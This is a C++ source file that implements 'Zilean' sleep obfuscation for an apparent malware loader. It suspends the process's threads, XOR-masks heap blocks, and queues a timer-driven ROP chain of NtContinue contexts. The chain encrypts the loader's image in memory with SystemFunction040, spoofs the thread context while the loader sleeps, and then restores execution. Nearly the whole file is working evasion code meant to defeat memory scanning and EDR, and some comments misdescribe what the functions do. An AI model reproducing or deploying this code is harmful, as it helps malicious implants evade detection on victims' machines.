/* Zilean.cpp */
#include <Windows.h>
#include <intrin.h>
#include "Structs.h"
#include "Primitives.h"
#include "Common.h"
#include "Debug.h"

/*================================================
@ XorCipher
# XOR-encrypts or decrypts a memory region in-place
# using a rolling key. Symmetric — call again with
# the same key to reverse the operation
================================================*/
VOID XorCipher(
    _In_ PBYTE pData,
    _In_ SIZE_T sSize,
    _In_ PBYTE pKey,
    _In_ SIZE_T sKeySize
) {
    for (SIZE_T i = 0, j = 0; i < sSize; i++, j++) {

        if (j >= sKeySize)
            j = 0;

        if (i % 2 == 0)
            pData[i] = pData[i] ^ pKey[j];
        else
            pData[i] = pData[i] ^ pKey[j] ^ j;
    }
}

/*================================================
@ Random32
# Generates a pseudo-random 32-bit value derived
# from KUSER_SHARED_DATA interrupt time fields
================================================*/
ULONG Random32() {

    UINT32 Seed = 0;

    _rdrand32_step(&Seed);

    return Seed;
}

/*================================================
@ SuspendThreads
# Enumerates all threads in the current process
# via NtQuerySystemInformation and suspends every
# thread except the caller
================================================*/
BOOL SuspendThreads(
    _In_ DWORD dwWorkerThreadId
) {
    ULONG                               ReturnLength1                   = 0;
    ULONG                               ReturnLength2                   = 0;
    PSYSTEM_PROCESS_INFORMATION         SystemInfo                      = nullptr;
    PVOID                               TempValue                       = nullptr;
    HANDLE                              ThreadHandle                    = nullptr;
    NTSTATUS                            Status                          = STATUS_SUCCESS;
    BOOL                                Success                         = FALSE;
    DWORD                               CurrentPid                      = GetCurrentProcessId();
    DWORD                               CurrentTid                      = GetCurrentThreadId();

    /* Call NtQuerySystemInformation for the first time, which will fail with 'STATUS_INFO_LENGTH_MISMATCH' */
    if ((Status = g_Win32.Nt.NtQuerySystemInformation(SystemProcessInformation, nullptr, 0, &ReturnLength1)) != STATUS_SUCCESS && Status != STATUS_INFO_LENGTH_MISMATCH) {
#ifdef DEBUG
        DBGPRINT("[-] NtQuerySystemInformation Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
        goto Leave;
    }

    /* Allocate buffer of size 'ReturnLength1' */
    SystemInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)ReturnLength1);
    if (SystemInfo == nullptr) {
#ifdef DEBUG
        DBGPRINT("[-] HeapAlloc Failed With Error -> %d - %s.%d \n", GetLastError(), GET_FILENAME(__FILE__), __LINE__);
#endif
        goto Leave;
    }

    TempValue = SystemInfo;

    /* Call NtQuerySystemInformation again with correct arguments */
    if ((Status = g_Win32.Nt.NtQuerySystemInformation(SystemProcessInformation, SystemInfo, ReturnLength1, &ReturnLength2)) != STATUS_SUCCESS) {
#ifdef DEBUG
        DBGPRINT("[-] NtQuerySystemInformation[2] Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
        goto Leave;
    }

    /* Iterate through process list */
    while (TRUE) {

        /* Find local process */
        if ((DWORD)SystemInfo->UniqueProcessId == CurrentPid) {

            /* Iterate through thread list */
            for (int i = 0; i < SystemInfo->NumberOfThreads; i++) {

                DWORD ThreadId = (DWORD)SystemInfo->Threads[i].ClientId.UniqueThread;

                /* Skip local & worker thread */
                if (ThreadId == CurrentTid || ThreadId == dwWorkerThreadId)
                    continue;

                /* Open a handle to thread */
                CLIENT_ID Cid = {
                    .UniqueProcess = (HANDLE)CurrentPid,
                    .UniqueThread  = (HANDLE)ThreadId
                };

                OBJECT_ATTRIBUTES Oa = { sizeof(OBJECT_ATTRIBUTES) };

                if (!NT_SUCCESS(Status = g_Win32.Nt.NtOpenThread(&ThreadHandle, THREAD_ALL_ACCESS, &Oa, &Cid)))
                    continue;

                /* Suspend threads */
                g_Win32.Nt.NtSuspendThread(
                    ThreadHandle,
                    nullptr
                );

                Macro::DeleteHandle(ThreadHandle);
            }

            break;
        }

        /* If NextEntryOffset is 0, that means we've reached the end */
        if (!SystemInfo->NextEntryOffset)
            break;

        /* Move to the next entry */
        SystemInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemInfo + SystemInfo->NextEntryOffset);
    }

    Success = TRUE;

Leave:
    if (TempValue) {
        Macro::DeletePtr(TempValue);
    }

    if (ThreadHandle) {
        Macro::DeleteHandle(ThreadHandle);
    }

    return Success;
}

/*================================================
@ ResumeThreads
# Resumes all previously suspended threads by
# reversing the SuspendThreads operation
================================================*/
BOOL ResumeThreads(
    _In_ DWORD dwWorkerThreadId
) {
    ULONG                               ReturnLength1                   = 0;
    ULONG                               ReturnLength2                   = 0;
    PSYSTEM_PROCESS_INFORMATION         SystemInfo                      = nullptr;
    PVOID                               TempValue                       = nullptr;
    HANDLE                              ThreadHandle                    = nullptr;
    NTSTATUS                            Status                          = STATUS_SUCCESS;
    BOOL                                Success                         = FALSE;
    DWORD                               CurrentPid                      = GetCurrentProcessId();
    DWORD                               CurrentTid                      = GetCurrentThreadId();

    /* Call NtQuerySystemInformation for the first time, which will fail with 'STATUS_INFO_LENGTH_MISMATCH' */
    if ((Status = g_Win32.Nt.NtQuerySystemInformation(SystemProcessInformation, nullptr, 0, &ReturnLength1)) != STATUS_SUCCESS && Status != STATUS_INFO_LENGTH_MISMATCH) {
#ifdef DEBUG
        DBGPRINT("[-] NtQuerySystemInformation Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
        goto Leave;
    }

    /* Allocate buffer of size 'ReturnLength1' */
    SystemInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)ReturnLength1);
    if (SystemInfo == nullptr) {
#ifdef DEBUG
        DBGPRINT("[-] HeapAlloc Failed With Error -> %d - %s.%d \n", GetLastError(), GET_FILENAME(__FILE__), __LINE__);
#endif
        goto Leave;
    }

    TempValue = SystemInfo;

    /* Call NtQuerySystemInformation again with correct arguments */
    if ((Status = g_Win32.Nt.NtQuerySystemInformation(SystemProcessInformation, SystemInfo, ReturnLength1, &ReturnLength2)) != STATUS_SUCCESS) {
#ifdef DEBUG
        DBGPRINT("[-] NtQuerySystemInformation[2] Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
        goto Leave;
    }

    /* Iterate through process list */
    while (TRUE) {

        /* Find local process */
        if ((DWORD)SystemInfo->UniqueProcessId == CurrentPid) {

            /* Iterate through thread list */
            for (int i = 0; i < SystemInfo->NumberOfThreads; i++) {

                DWORD ThreadId = (DWORD)SystemInfo->Threads[i].ClientId.UniqueThread;

                /* Skip local & worker thread */
                if (ThreadId == CurrentTid || ThreadId == dwWorkerThreadId)
                    continue;

                /* Open a handle to thread */
                CLIENT_ID Cid = {
                    .UniqueProcess = (HANDLE)CurrentPid,
                    .UniqueThread = (HANDLE)ThreadId
                };

                OBJECT_ATTRIBUTES Oa = { sizeof(OBJECT_ATTRIBUTES) };

                if (!NT_SUCCESS(Status = g_Win32.Nt.NtOpenThread(&ThreadHandle, THREAD_ALL_ACCESS, &Oa, &Cid)))
                    continue;

                /* Resume threads */
                g_Win32.Nt.NtResumeThread(
                    ThreadHandle,
                    nullptr
                );

                Macro::DeleteHandle(ThreadHandle);
            }

            break;
        }

        /* If NextEntryOffset is 0, that means we've reached the end */
        if (!SystemInfo->NextEntryOffset)
            break;

        /* Move to the next entry */
        SystemInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemInfo + SystemInfo->NextEntryOffset);
    }

    Success = TRUE;

Leave:
    if (TempValue) {
        Macro::DeletePtr(TempValue);
    }

    if (ThreadHandle) {
        Macro::DeleteHandle(ThreadHandle);
    }

    return Success;
}

BOOL GetRandomThreadContext(
    OUT PCONTEXT pCtx
) {
    ULONG                                   ReturnLength1                   = 0;
    ULONG                                   ReturnLength2                   = 0;
    PSYSTEM_PROCESS_INFORMATION             SystemInfo                      = nullptr;
    PVOID                                   TempValue                       = nullptr;
    HANDLE                                  ThreadHandle                    = nullptr;
    NTSTATUS                                Status                          = STATUS_SUCCESS;
    BOOL                                    Success                         = FALSE;
    DWORD                                   CurrentPid                      = GetCurrentProcessId();
    DWORD                                   CurrentTid                      = GetCurrentThreadId();

    /* Call NtQuerySystemInformation for the first time, which will fail with 'STATUS_INFO_LENGTH_MISMATCH' */
    if ((Status = g_Win32.Nt.NtQuerySystemInformation(SystemProcessInformation, nullptr, 0, &ReturnLength1)) != STATUS_SUCCESS && Status != STATUS_INFO_LENGTH_MISMATCH) {
#ifdef DEBUG
        DBGPRINT("[-] NtQuerySystemInformation Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
        goto Leave;
    }

    /* Allocate buffer of size 'ReturnLength1' */
    SystemInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)ReturnLength1);
    if (SystemInfo == nullptr) {
#ifdef DEBUG
        DBGPRINT("[-] HeapAlloc Failed With Error -> %d - %s.%d \n", GetLastError(), GET_FILENAME(__FILE__), __LINE__);
#endif
        goto Leave;
    }

    TempValue = SystemInfo;

    /* Call NtQuerySystemInformation again with correct arguments */
    if ((Status = g_Win32.Nt.NtQuerySystemInformation(SystemProcessInformation, SystemInfo, ReturnLength1, &ReturnLength2)) != STATUS_SUCCESS) {
#ifdef DEBUG
        DBGPRINT("[-] NtQuerySystemInformation[2] Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
        goto Leave;
    }

    /* Iterate through process list */
    while (TRUE) {

        /* Find local process */
        if ((DWORD)SystemInfo->UniqueProcessId == CurrentPid) {

            /* Iterate through thread list */
            for (int i = 0; i < SystemInfo->NumberOfThreads; i++) {

                DWORD ThreadId = (DWORD)SystemInfo->Threads[i].ClientId.UniqueThread;

                /* Skip local thread */
                if (ThreadId == CurrentTid)
                    continue;

                /* Open a handle to thread */
                CLIENT_ID Cid = {
                    .UniqueProcess = (HANDLE)CurrentPid,
                    .UniqueThread  = (HANDLE)ThreadId
                };

                OBJECT_ATTRIBUTES Oa = {sizeof(OBJECT_ATTRIBUTES)};

                if (!NT_SUCCESS(Status = g_Win32.Nt.NtOpenThread(&ThreadHandle, THREAD_ALL_ACCESS, &Oa, &Cid)))
                    continue;

                /* Get the context */
                pCtx->ContextFlags = CONTEXT_ALL;
                if (!NT_SUCCESS(Status = g_Win32.Nt.NtGetContextThread(ThreadHandle, pCtx))) {
                    Macro::DeleteHandle(ThreadHandle);
                    continue;
                }

                break;
            }

            break;
        }

        /* If NextEntryOffset is 0, that means we've reached the end */
        if (!SystemInfo->NextEntryOffset)
            break;

        /* Move to the next entry */
        SystemInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemInfo + SystemInfo->NextEntryOffset);
    }

    Success = TRUE;

Leave:
    if (TempValue) {
        Macro::DeletePtr(TempValue);
    }

    if (ThreadHandle) {
        Macro::DeleteHandle(ThreadHandle);
    }

    return Success;
}

/*================================================
@ MaskHeap
# Walks the process heap via HeapWalk and encrypts
# all busy allocations using SystemFunction032 (RC4)
# Symmetric — call again to decrypt
================================================*/
struct KEY {
    BYTE EncryptionKey[16];
};

VOID MaskHeap(
    _In_ KEY& Key,
    _In_ DWORD dwWorkerThreadId,
    _In_ BOOL bStart
) {
    PROCESS_HEAP_ENTRY                          HeapEntry                       = { 0 };
    ULONG                                       NumberOfHeaps                   = { 0 };
    PVOID                                       ProcessHeaps[256]               = { 0 };

    NumberOfHeaps = GetProcessHeaps(0, 0);
    if (NumberOfHeaps > 256)
        NumberOfHeaps = 256;

    NumberOfHeaps = GetProcessHeaps(NumberOfHeaps, ProcessHeaps);

    if (bStart) {
        
        for (int i = 0; i < sizeof(Key.EncryptionKey); i++) {
            Key.EncryptionKey[i] = Random32();
        }

        if (!SuspendThreads(dwWorkerThreadId)) {
            return;
        }
    } else {
        if (!ResumeThreads(dwWorkerThreadId)) {
            return;
        }
    }

    for (int i = 0; i < NumberOfHeaps; ++i) {

        if (ProcessHeaps[i] == GetProcessHeap()) {
            continue;
        }

        RtlSecureZeroMemory(&HeapEntry, sizeof(PROCESS_HEAP_ENTRY));
        while (g_Win32.K32.HeapWalk(ProcessHeaps[i], &HeapEntry)) {
            if (HeapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY) {
                XorCipher((PBYTE)HeapEntry.lpData, HeapEntry.cbData, Key.EncryptionKey, sizeof(Key.EncryptionKey));
            }
        }
    }
}


/*================================================
@ GetWorkerThreadId
# Retrieves the thread ID of the thread pool worker
# that will execute the ROP chain by queuing a
# lightweight probe work item
================================================*/
VOID GetWorkerThreadId(
    OUT PDWORD pdwThreadId
) {
    *pdwThreadId = GetCurrentThreadId();
}

/*================================================
@ MaskImage
# Encrypts the loader's image in memory using a
# ROP chain executed on a worker thread. Chains
# VirtualProtect → SystemFunction040 (encrypt) →
# Sleep → SystemFunction041 (decrypt) → restore
================================================*/
VOID MaskImage(
    _In_ DWORD dwTimeout
) {
    CONTEXT                                 Ctx[10]                 = { 0 };
    CONTEXT                                 CtxInit                 = { 0 };
    CONTEXT                                 CtxSpoof                = { 0 };
    CONTEXT                                 CtxBackup               = { 0 };
    HANDLE                                  EventStart              = { 0 };
    HANDLE                                  EventWait               = { 0 };
    HANDLE                                  EventTimer              = { 0 };
    HANDLE                                  EventEnd                = { 0 };
    HANDLE                                  Timer                   = { 0 };
    HANDLE                                  Thread                  = { 0 };
    DWORD                                   Delay                   = { 0 };
    DWORD                                   Protect                 = { 0 };    
    DWORD                                   ThreadId                = { 0 };
    KEY                                     Key                     = { 0 };
    NTSTATUS                                Status                  = STATUS_SUCCESS;

    /* Get image base & size of image */
    PVOID ImageBase         = (PVOID)NtCurrentTeb()->ProcessEnvironmentBlock->ImageBase;
    ULONG SizeOfImage       = ((PIMAGE_NT_HEADERS)((ULONG_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

#ifdef DEBUG
    DBGPRINT("\n[*] Masking the Image \n");
    DBGPRINT("\n[i] Image@ -> [0x%p] \n", ImageBase);
    DBGPRINT("\n[i] Size Of Image -> [%ld] Bytes \n", SizeOfImage);
#endif

    /* Create events for starting the rop chain and waiting for it to finish */
    if (!NT_SUCCESS(Status = g_Win32.Nt.NtCreateEvent(&EventTimer, EVENT_ALL_ACCESS, nullptr, NotificationEvent, FALSE)) ||
        !NT_SUCCESS(Status = g_Win32.Nt.NtCreateEvent(&EventStart, EVENT_ALL_ACCESS, nullptr, NotificationEvent, FALSE)) ||
        !NT_SUCCESS(Status = g_Win32.Nt.NtCreateEvent(&EventWait, EVENT_ALL_ACCESS, nullptr, NotificationEvent, FALSE)) ||
        !NT_SUCCESS(Status = g_Win32.Nt.NtCreateEvent(&EventEnd, EVENT_ALL_ACCESS, nullptr, NotificationEvent, FALSE))
        ) {
#ifdef DEBUG
        DBGPRINT("[-] NtCreateEvent Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
        goto Leave;
    }

    /* Get a thread context from local process */
    CtxSpoof.ContextFlags = CtxBackup.ContextFlags = CONTEXT_ALL;
    if (!GetRandomThreadContext(&CtxSpoof)) {
#ifdef DEBUG
        DBGPRINT("[-] Failed To Get Thread Context To Spoof - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
        goto Leave;
    }

    /* Fix race condition */
    if (NT_SUCCESS(Status = g_Win32.Nt.RtlRegisterWait(&Timer, EventWait, (WAITORTIMERCALLBACKFUNC)GetWorkerThreadId, &ThreadId, Delay += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE)) &&
        NT_SUCCESS(Status = g_Win32.Nt.RtlRegisterWait(&Timer, EventWait, (WAITORTIMERCALLBACKFUNC)g_Win32.Nt.RtlCaptureContext, &CtxInit, Delay += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE))
        ) {

        if (NT_SUCCESS(Status = g_Win32.Nt.RtlRegisterWait(&Timer, EventWait, (WAITORTIMERCALLBACKFUNC)g_Win32.K32.SetEvent, EventTimer, Delay += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE)))
        {
            if (!NT_SUCCESS(Status = g_Win32.Nt.NtWaitForSingleObject(EventTimer, FALSE, nullptr))) {
#ifdef DEBUG
                DBGPRINT("[-] NtWaitForSingleObject Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
                goto Leave;
            }

            /* Create a handle to the local process */
            if (!NT_SUCCESS(Status = g_Win32.Nt.NtDuplicateObject(NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &Thread, THREAD_ALL_ACCESS, 0, 0))) {
#ifdef DEBUG
                DBGPRINT("[-] NtDuplicateObject Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
                goto Leave;
            }

            /* Prepare rop chain */
            for (int i = 0; i < ARRAYSIZE(Ctx); i++) {
                Primitive::MemoryCopy(&Ctx[i], &CtxInit, sizeof(CONTEXT));
                Ctx[i].Rsp -= sizeof(PVOID);
            }

            /* Start of ropchain */
            Ctx[0].Rip          = (ULONG_PTR)(g_Win32.K32.WaitForSingleObjectEx);
            Ctx[0].Rcx          = (ULONG_PTR)(EventStart);
            Ctx[0].Rdx          = (ULONG_PTR)(INFINITE);
            Ctx[0].R8           = (ULONG_PTR)(FALSE);

            /* Change memory permissions to RW */
            Ctx[1].Rip          = (ULONG_PTR)(g_Win32.K32.VirtualProtect);
            Ctx[1].Rcx          = (ULONG_PTR)(ImageBase);
            Ctx[1].Rdx          = (ULONG_PTR)(SizeOfImage);
            Ctx[1].R8           = (ULONG_PTR)(PAGE_READWRITE);
            Ctx[1].R9           = (ULONG_PTR)(&Protect);

            /* Encrypt image base address */
            Ctx[2].Rip          = (ULONG_PTR)(g_Win32.CryptBase.SystemFunction040);
            Ctx[2].Rcx          = (ULONG_PTR)(ImageBase);
            Ctx[2].Rdx          = (ULONG_PTR)(SizeOfImage);

            /* Get backup of current context */
            Ctx[3].Rip          = (ULONG_PTR)(g_Win32.Nt.NtGetContextThread);
            Ctx[3].Rcx          = (ULONG_PTR)(Thread);
            Ctx[3].Rdx          = (ULONG_PTR)(&CtxBackup);

            /* Spoof of current thread stack */
            Ctx[4].Rip          = (ULONG_PTR)(g_Win32.Nt.NtSetContextThread);
            Ctx[4].Rcx          = (ULONG_PTR)(Thread);
            Ctx[4].Rdx          = (ULONG_PTR)(&CtxSpoof);

            /* Sleep */
            Ctx[5].Rip          = (ULONG_PTR)(g_Win32.K32.WaitForSingleObjectEx);
            Ctx[5].Rcx          = (ULONG_PTR)(NtCurrentProcess());
            Ctx[5].Rdx          = (ULONG_PTR)(dwTimeout);
            Ctx[5].R8           = (ULONG_PTR)(FALSE);

            /* Restore thread context from backup */
            Ctx[6].Rip          = (ULONG_PTR)(g_Win32.Nt.NtSetContextThread);
            Ctx[6].Rcx          = (ULONG_PTR)(Thread);
            Ctx[6].Rdx          = (ULONG_PTR)(&CtxBackup);

            /* Decrypt image base address */
            Ctx[7].Rip          = (ULONG_PTR)(g_Win32.CryptBase.SystemFunction041);
            Ctx[7].Rcx          = (ULONG_PTR)(ImageBase);
            Ctx[7].Rdx          = (ULONG_PTR)(SizeOfImage);

            /* Change memory permission to RX */
            Ctx[8].Rip          = (ULONG_PTR)(g_Win32.K32.VirtualProtect);
            Ctx[8].Rcx          = (ULONG_PTR)(ImageBase);
            Ctx[8].Rdx          = (ULONG_PTR)(SizeOfImage);
            Ctx[8].R8           = (ULONG_PTR)(PAGE_EXECUTE_READ);
            Ctx[8].R9           = (ULONG_PTR)(&Protect);

            /* End of ropchain */
            Ctx[9].Rip          = (ULONG_PTR)(g_Win32.K32.SetEvent);
            Ctx[9].Rcx          = (ULONG_PTR)(EventEnd);

            /* Mask heap */
#ifdef DEBUG
            DBGPRINT("[*] Masking The Heap Blocks \n");
#endif
            MaskHeap(Key, ThreadId, TRUE);

#ifdef DEBUG
            DBGPRINT("[*] Queuing ROP Chain \n");
#endif
            /* Execute Timers */
            for (int i = 0; i < ARRAYSIZE(Ctx); i++) {
                if (!NT_SUCCESS(Status = g_Win32.Nt.RtlRegisterWait(&Timer, EventWait, (WAITORTIMERCALLBACKFUNC)g_Win32.Nt.NtContinue, &Ctx[i], Delay += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE))) {
#ifdef DEBUG
                    DBGPRINT("[-] RtlRegisterWait Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
                    goto Leave;
                }
            }

#ifdef DEBUG
            DBGPRINT("\n[*] Triggering Sleep Obfuscation \n");
#endif
            Status = g_Win32.Nt.NtSignalAndWaitForSingleObject(EventStart, EventEnd, FALSE, nullptr);

            /* Unmask heap */
#ifdef DEBUG
            DBGPRINT("\n[*] Unmasking The Heap Blocks \n");
#endif
            MaskHeap(Key, ThreadId, FALSE);

            if (!NT_SUCCESS(Status)) {
#ifdef DEBUG
                DBGPRINT("[-] NtSignalAndWaitForSingleObject Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
                goto Leave;
            }
        } else {
#ifdef DEBUG
            DBGPRINT("[-] RtlRegisterWait Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
        }
    } else {
#ifdef DEBUG
        DBGPRINT("[-] RtlRegisterWait Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
    }

#ifdef DEBUG
    DBGPRINT("\n[+] Sleep Cycle Complete \n");
#endif

Leave:
    if (EventTimer) {
        Macro::DeleteHandle(EventTimer);
    }

    if (EventStart) {
        Macro::DeleteHandle(EventStart);
    }

    if (EventWait) {
        Macro::DeleteHandle(EventWait);
    }

    if (EventEnd) {
        Macro::DeleteHandle(EventEnd);
    }

    if (Thread) {
        Macro::DeleteHandle(Thread);
    }
}